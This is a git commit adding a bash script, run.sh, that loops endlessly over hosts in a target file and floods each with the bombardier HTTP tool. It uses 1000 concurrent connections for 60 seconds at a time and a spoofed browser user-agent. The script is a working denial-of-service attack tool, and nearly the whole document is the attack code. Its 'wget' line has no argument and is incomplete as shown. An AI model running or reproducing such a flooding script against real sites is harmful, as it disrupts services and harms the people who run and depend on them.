168c2598a51324ae61b50682858b3e9a4f6ff888
Anton Klyba <antonklyba@pingidentity.com>
2022-02-27 11:49:17 +0200

    initial

---
+++ run.sh
@@ -0,0 +1,11 @@
+#!/usr/bin/env bash
+
+while true
+do
+    wget 
+    cat targers.txt | while read line
+    do
+        bombardier -c 1000 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
+    done
+    sleep 60
+done
